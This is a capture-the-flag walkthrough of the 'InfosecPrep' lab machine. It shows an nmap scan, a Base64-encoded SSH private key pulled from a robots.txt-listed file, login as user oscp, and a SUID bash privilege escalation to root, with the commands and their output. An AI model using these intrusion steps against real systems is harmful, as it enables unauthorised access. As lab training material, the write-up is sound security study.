---
layout: default
title: InfosecPrep
parent: Proving Grounds Play
nav_order: 19
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/infosecprep]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.160.89
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-12 13:04 EST
Nmap scan report for 192.168.160.89
Host is up (0.073s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 91:ba:0d:d4:39:05:e3:13:55:57:8f:1b:46:90:db:e4 (RSA)
|   256 0f:35:d1:a1:31:f2:f6:aa:75:e8:17:01:e7:1e:d1:d5 (ECDSA)
|_  256 af:f1:53:ea:7b:4d:d7:fa:d8:de:0d:f2:28:fc:86:d7 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: OSCP Voucher &#8211; Just another WordPress site
|_http-generator: WordPress 5.4.2
| http-robots.txt: 1 disallowed entry
|_/secret.txt
|_http-server-header: Apache/2.4.41 (Ubuntu)
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|_    HY000

```

# Enumeration

---

## 80 | HTTP

![index](../../../assets/images/ctfs/proving_grounds/infosecprep/index.png)

The web site indicates there is a user _oscp_

Robots.txt indicates a root level file _secret.txt_

![robots](../../../assets/images/ctfs/proving_grounds/infosecprep/robots.png)

_/secret.txt_ contains string of text that appears to be Base64 encoded.

![encoded](../../../assets/images/ctfs/proving_grounds/infosecprep/encoded.png)

Decoding the Base64 encoded string provides a RSA private key.

![rsa](../../../assets/images/ctfs/proving_grounds/infosecprep/rsa.png)

# Exploitation

---

We have an RSA private key and a user _oscp_.

We can use both to connect to the SSH service running on the target.

```bash

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/infosecprep]
└─$ ssh -i id_rsa oscp@192.168.160.89
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 12 Nov 2023 06:07:32 PM UTC

  System load:  0.0                Processes:             211
  Usage of /:   25.4% of 19.56GB   Users logged in:       0
  Memory usage: 62%                IPv4 address for eth0: 192.168.160.89
  Swap usage:   0%


0 updates can be installed immediately.
0 of these updates are security updates.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

-bash-5.0$ id
uid=1000(oscp) gid=1000(oscp) groups=1000(oscp),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
-bash-5.0$

```

# Post-Exploitation

---

## Check SUID Permissions

```bash
find / -perm -u=s -type f 2>/dev/null
```

We can run _/usr/bin/bash_ with root privileges to get a root shell.

```bash
-bash-5.0$ /usr/bin/bash -p
bash-5.0# id
uid=1000(oscp) gid=1000(oscp) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd),1000(oscp)
bash-5.0# whoami
root
```
